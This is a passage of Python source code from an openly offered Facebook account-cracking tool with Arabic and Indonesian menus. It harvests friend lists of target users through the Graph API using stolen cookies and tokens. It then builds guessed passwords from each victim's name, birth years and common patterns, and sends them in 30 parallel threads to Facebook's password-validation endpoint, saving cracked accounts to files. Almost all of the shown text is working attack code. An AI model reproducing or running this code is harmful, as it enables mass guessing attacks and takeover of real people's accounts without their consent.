							r.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site',})
							response7 = r.get(status_url, cookies = {'cookie': your_cookies}).text
							access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
							
							tokenew = open(".token.txt","w").write(access_token)
							cook= open(".cok.txt","w").write(your_cookies)
							print('')
							print(f"{x}[{h}‚àö{x}]{h} ÿ™ŸÖ ÿßÿ∂ÿßŸÅŸá ÿßŸÑŸÉŸàŸÉŸäÿ≤ ÿ®ŸÜÿ¨ÿßÿ≠ ÿßÿ±ÿ¨ÿπ ÿ±ÿ¨Ÿàÿπ Ÿàÿ≥ÿ¨ŸÑ ÿØÿÆŸàŸÑ ŸÖÿ±Ÿá ÿßÿÆÿ±ÿ¶{x} ");time.sleep(1);exit()
			except Exception as e:
				
				os.system('rm -rf .token.txt && rm -rf .cok.txt')
				print(e)
				time.sleep(3)
				back()
	except:pass	
def menu(my_name,my_id):
	ip = requests.get("https://api.ipify.org").text
	
	os.system('clear')
	banner()
	print(f'''\x1b[1;91m_____________________________________‚†Ä\n
	
	ÿßŸáŸÑŸÜ Ÿàÿ≥ŸáŸÑŸÜ  ÿ¥ÿ±ŸÅÿ™Ÿà ŸàŸÜŸàÿ±ÿ™Ÿà  ÿßŸÜÿ™ÿ∂ÿ± ÿßŸÑÿµŸäÿØ ŸÑÿß ÿ™ÿ™ÿπÿ¨ŸÑ ÿßÿµÿ®ÿ±  ÿ®ÿØÿßŸäŸá ŸÖŸà ŸÅŸÇŸá
	ÿ™ÿ≠Ÿäÿßÿ™Ÿä ÿßŸÑŸÖÿ∑Ÿàÿ± BXE
_________________________________________________________
‚†Ä
''')
	print(f'\x1b[1;96mID : '+str(my_id))
	print(f'\x1b[1;92m__________________________________________________ ')
	print(f'\x1b[1;91mVIB.SBED ')
	print(f'\x1b[1;92m__________________________________________________ ')
	print(f'[ÿ™ÿßÿ±ŸäÿÆ ÿ™ÿ≠ÿØŸäÿ´ ÿßŸÑÿßÿµÿØÿßÿ±2024] ')
	print(f'\x1b[1;91m¬ª[V.7]¬´ ÿßŸÑÿßÿµÿØÿßÿ±ÿßŸÑÿ™ÿ≠ÿØŸäÿ´ ÿßŸÑÿ¨ÿØŸäÿØ')
	print (f'''\033[1;32m \n
 ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà
‚ñà‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñà‚ñà‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñà‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñà‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñà
‚ñà‚ñí‚ñí‚ñÑ‚ñÄ‚ñí‚ñí‚ñà‚ñà‚ñí‚ñí‚ñÑ‚ñÄ‚ñí‚ñí‚ñà‚ñí‚ñí‚ñÑ‚ñÄ‚ñÑ‚ñÄ‚ñÑ‚ñÄ‚ñí‚ñí‚ñà‚ñí‚ñí‚ñÑ‚ñÄ‚ñÑ‚ñÄ‚ñÑ‚ñÄ‚ñÑ‚ñÄ‚ñÑ‚ñÄ‚ñí‚ñí‚ñà
‚ñà‚ñí‚ñí‚ñÑ‚ñÄ‚ñí‚ñí‚ñà‚ñà‚ñí‚ñí‚ñÑ‚ñÄ‚ñí‚ñí‚ñà‚ñí‚ñí‚ñí‚ñí‚ñÑ‚ñÄ‚ñí‚ñí‚ñí‚ñí‚ñà‚ñí‚ñí‚ñÑ‚ñÄ‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñÑ‚ñÄ‚ñí‚ñí‚ñà
‚ñà‚ñí‚ñí‚ñÑ‚ñÄ‚ñí‚ñí‚ñà‚ñà‚ñí‚ñí‚ñÑ‚ñÄ‚ñí‚ñí‚ñà‚ñà‚ñà‚ñí‚ñí‚ñÑ‚ñÄ‚ñí‚ñí‚ñà‚ñà‚ñà‚ñí‚ñí‚ñÑ‚ñÄ‚ñí‚ñí‚ñà‚ñà‚ñí‚ñí‚ñÑ‚ñÄ‚ñí‚ñí‚ñà
‚ñà‚ñí‚ñí‚ñÑ‚ñÄ‚ñí‚ñí‚ñà‚ñà‚ñí‚ñí‚ñÑ‚ñÄ‚ñí‚ñí‚ñà‚ñà‚ñà‚ñí‚ñí‚ñÑ‚ñÄ‚ñí‚ñí‚ñà‚ñà‚ñà‚ñí‚ñí‚ñÑ‚ñÄ‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñÑ‚ñÄ‚ñí‚ñí‚ñà
‚ñà‚ñí‚ñí‚ñÑ‚ñÄ‚ñí‚ñí‚ñà‚ñà‚ñí‚ñí‚ñÑ‚ñÄ‚ñí‚ñí‚ñà‚ñà‚ñà‚ñí‚ñí‚ñÑ‚ñÄ‚ñí‚ñí‚ñà‚ñà‚ñà‚ñí‚ñí‚ñÑ‚ñÄ‚ñÑ‚ñÄ‚ñÑ‚ñÄ‚ñÑ‚ñÄ‚ñÑ‚ñÄ‚ñí‚ñí‚ñà
‚ñà‚ñí‚ñí‚ñÑ‚ñÄ‚ñí‚ñí‚ñà‚ñà‚ñí‚ñí‚ñÑ‚ñÄ‚ñí‚ñí‚ñà‚ñà‚ñà‚ñí‚ñí‚ñÑ‚ñÄ‚ñí‚ñí‚ñà‚ñà‚ñà‚ñí‚ñí‚ñÑ‚ñÄ‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñà
‚ñà‚ñí‚ñí‚ñÑ‚ñÄ‚ñÑ‚ñÄ‚ñí‚ñí‚ñÑ‚ñÄ‚ñÑ‚ñÄ‚ñí‚ñí‚ñà‚ñà‚ñà‚ñí‚ñí‚ñÑ‚ñÄ‚ñí‚ñí‚ñà‚ñà‚ñà‚ñí‚ñí‚ñÑ‚ñÄ‚ñí‚ñí‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà
‚ñà‚ñí‚ñí‚ñí‚ñí‚ñÑ‚ñÄ‚ñÑ‚ñÄ‚ñÑ‚ñÄ‚ñí‚ñí‚ñí‚ñí‚ñà‚ñí‚ñí‚ñí‚ñí‚ñÑ‚ñÄ‚ñí‚ñí‚ñí‚ñí‚ñà‚ñí‚ñí‚ñÑ‚ñÄ‚ñí‚ñí‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà
‚ñà‚ñà‚ñà‚ñí‚ñí‚ñí‚ñí‚ñÑ‚ñÄ‚ñí‚ñí‚ñí‚ñí‚ñà‚ñà‚ñà‚ñí‚ñí‚ñÑ‚ñÄ‚ñÑ‚ñÄ‚ñÑ‚ñÄ‚ñí‚ñí‚ñà‚ñí‚ñí‚ñÑ‚ñÄ‚ñí‚ñí‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà
‚ñà‚ñà‚ñà‚ñà‚ñà‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñà‚ñà‚ñà‚ñà‚ñà‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñà‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà
‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà\n
‚ñÜ‚ñÜ‚ñÜ‚ñÜ‚ñÜ‚ñÜ‚ñÜ‚ñÜ‚ñÜ‚ñÜ‚ñÜ‚ñÜ‚ñÜ‚ñÜ‚ñÜ‚ñÜ‚ñÜ‚ñÜ‚ñÜ‚ñÜ‚ñÜ‚ñÜ‚ñÜ‚ñÜ‚ñÜ‚ñÜ‚ñÜ‚ñÜ‚ñÜ‚ñÜ‚ñÜ‚ñÜ‚ñÜ‚ñÜ‚ñÜ‚ñÜ
‚ôï__________________@H_S_W_M_____________________‚ôï
‚ôï_____________________@H_S_W_M______________________‚ôï
''')
	print(('‚Äî'*25)+'\n‚Ä¢ DeCoDe By @H_S_W_M ‚Ä¢\n'+('‚Äî'*25))
#                	print(f""" \x1b[1;96m01 | ŸÖŸÜ ÿßŸÑÿßÿµÿØŸÇÿßÿ° ŸÖŸÜ ÿßŸäÿØŸä Ÿàÿßÿ≠ÿØ 02 | ŸÖŸÜ ÿßŸÑÿßÿµÿØŸÇÿßÿ° ŸÖŸÜ ÿπÿØŸá ÿßŸäÿØŸäÿßÿ™03  | ŸÖŸÜ ŸÖŸÑŸÅ  """)
	Meledak = input('\033[1;97m\n[‚Ä¢]  ÿßÿÆÿ™ÿßÿ±  : 2]:  ')
	print('\033[2;31m\n‚öúÔ∏è¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª  ‚öúÔ∏è')
	if Meledak in ['1']:
		dump_publik()
	elif Meledak in ['2']:
		dump_massal()
	elif Meledak in ['3']:
		crack_file()
	elif Meledak in ['6']:
		result()
	elif Meledak in ['5']:
		file_cp()
	#elif Meledak in ['4']:
		#siu()
	#elif Meledak in ['0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cok.txt')
		print(' Successfully Logout+Delete Cookies‚àö ')
		exit()
	else:
		print(' input correctly ')
		back()
def siu():
	start()
	get_data_web()
	akhir()
def error():
	print(f' Sorry, this feature is still being fixed {x}')
	time.sleep(4)
	back()
def ganti_tema():
		print(""" Maaf Tools Ini Sedang Di Perbaiki """)
		sleep(2) 
		back()
def dump_publik():
	try:
		token = open('.token.txt','r').read()
		kukis = open('.cok.txt','r').read()
	except IOError:
		exit()
	print('')
	pil = input('ID : ')
	try:
		koh2 = requests.get('https://graph.facebook.com/v1.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0],cookies={'cookie': kukis}).json()
		for pi in koh2['friends']['data']:
			try:id.append(pi['id']+'|'+pi['name'])
			except:continue
		print('')
		print(f'Total ID >> {h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print('\033[1;33mInternetmu Gak Ada Bodoh')
		exit()
	except (KeyError,IOError):
		print('\033[1;33mPertemanan Tidak Publick Cookie And Token Anda Busuk')
		exit()

def dump_massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		jum = int(input('\033[2;36m\nŸÉŸÖ ÿßŸäÿØŸä ÿ™ÿ±ŸäÿØ ÿßŸÜ ÿ™ÿ∂ÿπ :'))
		print('\033[2;31m\n‚öúÔ∏è¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª  ‚öúÔ∏è')
	except ValueError:
		print(' ')
		exit()
	if jum<1 or jum>100:
		print('Failed Dump Id maybe id is not public ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input(''+str(yz) + 'ÿßŸäÿØŸäID: ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print(' unstable signal ')
			exit()
	try:
		print('\033[2;31m\n‚öúÔ∏è¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª  ‚öúÔ∏è')
		print(f' ID >> ÿπÿØÿØ{h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print('')
		print('unstable signal ')
		back()
	except (KeyError,IOError):
		print(f'{k}Friendship Not Public {x}')
		time.sleep(3)
		back()
		
def result():
	print(' 1. Check Cracked CP Account ')
	print(' 2. Check Cracked OK Account ')
	print(' 0. Exit	')
	kz = input('\n Chouse : ')
	print('')
	if kz in ['1','01']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print(' File Tidak Di Temukan ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print(' Anda Tidak Memiliki Hasil CP ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(''+nom+'. '+isi+'\033[31m '+str(len(hem))+' \033[0mcekpoint '+x)
				else:
					lol.update({str(cih):str(isi)})
					print(''+str(cih)+'. '+isi+'\x1b[1;96m '+str(len(hem))+' \033[0mcekpoint '+x)
			geeh = input('\n Chouse : ')
			print('')
			try:geh = lol[geeh]
			except KeyError:
				print(' Pilih Yang Bener Kontol ')
				exit()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print(' File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f' CP\033[33m {cpkuni[0]}|{cpkuni[1]}\033[0m')
				nocp +=1
			input('\n Back Enter ')
			back()
	elif kz in ['2','02']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print(' File Tidak Di Temukan ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print(' Anda Tidak Mempunyai File OK ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<100:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(''+nom+'. '+isi+'\033[32m '+str(len(hem))+' \033[0mSucses '+x)
				else:
					lol.update({str(cih):str(isi)})
					print(''+str(cih)+'. '+isi+'\033[32m '+str(len(hem))+' \033[0mSucses '+x)
			geeh = input('\n Chouse : ')
			try:geh = lol[geeh]
			except KeyError:
				print(' Pilih Yang Bener Kontol ')
				exit()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print(' File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'\n OK\033[32m {cpkuni[0]}|{cpkuni[1]}|\033[32m{cpkuni[2]}\033[0m')
				nocp +=1
			input('\n Back Enter ')
			back()
	elif kz in ['0','00']:
		back()
	else:
		print('Pilih Yang Bener Kontol ')
		exit()

def crack_file():
	try:
		
		
		jum = input('[*] INPUT FILE : ')
		for line in open(jum, 'r').readlines():
			id.append(line.strip())
		print(f':ÿπÿØÿØ ID >> {h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
			print('[‚úò] No Connection  ')
			exit()
	except (KeyError,IOError):
			print('[‚úò] Id Is Not Public')
			time.sleep(3)
	setting()

def setting():
	print('')

#  	print('\x1b[1;96m1 - ÿßÿÆÿ™ÿßÿ± ÿ±ŸÇŸÖ 1')
	
	print('\033[2;31m\n‚öúÔ∏è¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª  ‚öúÔ∏è')

	hu = input('\033[1;33m\n[‚úì]‚ôï[ ÿßÿÆÿ™ÿßÿ±  : 1] : ')
	if hu in ['','old']:
		for tua in sorted(id):
			id2.append(tua)
			
	#elif hu in ['3','new']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['1','random']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('input correctly ')
		exit()
		print('')
		
	print('')
#  	print('\x1b[1;96m - Methode Mobile|ÿßÿÆÿ™ÿßÿ±: 1' )
	
	print('\033[2;31m\n‚öúÔ∏è¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª  ‚öúÔ∏è')
	hc = input('\033[1;33m\n[‚úì]‚ôï[ ÿßÿÆÿ™ÿßÿ±  : 1] :')
	if hc in ['1','01']:
		method.append('mobile')
	#elif hc in ['2','02']:
		method.append('free')
	#elif hc in ['3','03']:
		method.append('mbasic')
	else:
		method.append('mobile')

	passu()
def mie():
	global prog,des
	print('\033[2;31m\n‚öúÔ∏è¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª  ‚öúÔ∏è')
	 
	
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(nmf)
						pwv.append('112233445566')
						pwv.append('1122334455')
						pwv.append('123456')
						pwv.append('1234512345')
						pwv.append('12345@')
						pwv.append('00998877')
						pwv.append('11223344@@')
						pwv.append('11223344')
						pwv.append('11223344556677')
						pwv.append('qqwweerr')
						pwv.append('07700770')
						pwv.append('07800780')
						pwv.append('ppooiiuu')
						pwv.append('zzzzxxxx')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append('112233445566')
						pwv.append('1122334455')
						pwv.append('123456')
						pwv.append('1234512345')
						pwv.append('12345@')
						pwv.append('00998877')
						pwv.append('11223344@@')
						pwv.append('11223344')
						pwv.append('11223344556677')
						pwv.append('qqwweerr')
						pwv.append('07700770')
						pwv.append('07800780')
						pwv.append('ppooiiuu')
						pwv.append('zzzzxxxx')
				if 'ya' in pwpluss:
					for xpwd in pwnya:
						pwv.append(xpwd)
				else:pass
				if 'mobile' in method:
					pool.submit(crack,idf,pwv)
				elif 'free' in method:
					pool.submit(crackfree,idf,pwv)
				elif 'mbasic' in method:
					pool.submit(crackmbasic,idf,pwv)
				else:
					pool.submit(crack,idf,pwv)
		print('')
		cetak(' \r%s [VIB] %s/%s $ [OK] %s $[CP] %s $ %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
		print('')
def passu():
	global prog,des
	print('')
	
	
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(nmf)
						pwv.append(frs+'2005')
						pwv.append(frs+'2004')
						pwv.append(frs+'2003')
						pwv.append(frs+'2002')
						pwv.append(frs+'2001')
						pwv.append(frs+'2000')
						pwv.append(frs+'1999')
						pwv.append(frs+'1998')
						pwv.append(frs+'1997')
						pwv.append(frs+'1996')
						pwv.append(frs+'1995')
						pwv.append(frs+'1994')
						pwv.append(frs+'1993')
						pwv.append(frs+'1992')
						pwv.append(frs+'1991')
						pwv.append(frs+'1990')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'2005')
						pwv.append(frs+'2004')
						pwv.append(frs+'2003')
						pwv.append(frs+'2002')
						pwv.append(frs+'2001')
						pwv.append(frs+'2000')
						pwv.append(frs+'1999')
						pwv.append(frs+'1998')
						pwv.append(frs+'1997')
						pwv.append(frs+'1996')
						pwv.append(frs+'1995')
						pwv.append(frs+'1994')
						pwv.append(frs+'1993')
						pwv.append(frs+'1992')
						pwv.append(frs+'1991')
						pwv.append(frs+'1990')
				if 'ya' in pwpluss:
					for xpwd in pwnya:
						pwv.append(xpwd)
				else:pass
				if 'mobile' in method:
					pool.submit(crack,idf,pwv)
				elif 'free' in method:
					pool.submit(crackfree,idf,pwv)
				elif 'mbasic' in method:
					pool.submit(crackmbasic,idf,pwv)
				else:
					pool.submit(crack,idf,pwv)
		print('')
		cetak(' \r%s [VIB] %s/%s $ [OK] %s $[CP] %s $ %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
		print('')
def sulap():
	global prog,des
	print('')
	
	
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(nmf)
						pwv.append('19901990')
						pwv.append('19911991')
						pwv.append('19921992')
						pwv.append('19931993')
						pwv.append('19941994')
						pwv.append('19951995')
						pwv.append('19961996')
						pwv.append('19971997')
						pwv.append('19981998')
						pwv.append('19991999')
						pwv.append('20002000')
						pwv.append('20012001')
						pwv.append('20022002')
						pwv.append('20032003')
						pwv.append('20042004')
						
				else:
					if len(frs)<3:
						pwv.append(nmf)
						pwv.append('19901990')
						pwv.append('19911991')
						pwv.append('19921992')
						pwv.append('19931993')
						pwv.append('19941994')
						pwv.append('19951995')
						pwv.append('19961996')
						pwv.append('19971997')
						pwv.append('19981998')
						pwv.append('19991999')
						pwv.append('20002000')
						pwv.append('20012001')
						pwv.append('20022002')
						pwv.append('20032003')
						pwv.append('20042004')
					
				if 'ya' in pwpluss:
					for xpwd in pwnya:
						pwv.append(xpwd)
				else:pass
				if 'mobile' in method:
					pool.submit(crack,idf,pwv)
				elif 'free' in method:
					pool.submit(crackfree,idf,pwv)
				elif 'mbasic' in method:
					pool.submit(crackmbasic,idf,pwv)
				else:
					pool.submit(crack,idf,pwv)
		print('')
		cetak(' \r%s [VIB] %s/%s $ [OK] %s $[CP] %s $ %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
		print('')
		
def babi():
	global prog,des
	print('')
	
	#print(f'Mati/hidupkan Mode terbang 500 id Jika Tidak Ada Hasil\n')
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
				if 'ya' in pwpluss:
					for xpwd in pwnya:
						pwv.append(xpwd)
				else:pass
				if 'mobile' in method:
					pool.submit(crack,idf,pwv)
				elif 'free' in method:
					pool.submit(crackfree,idf,pwv)
				elif 'mbasic' in method:
					pool.submit(crackmbasic,idf,pwv)
				else:
					pool.submit(crack,idf,pwv)
		print('')
		cetak(' \r%s [VIB] %s/%s $ [OK] %s $[CP] %s $ %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
		print('')
def crack(idf,pwv):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	print('\r%s LODNG %s/%s ‚úüOK‚úü %s ‚úüCP‚úü%s ‚úü %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			tix = time.time()
			ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F').text
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
			ses.headers.update({"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
				print('\n')
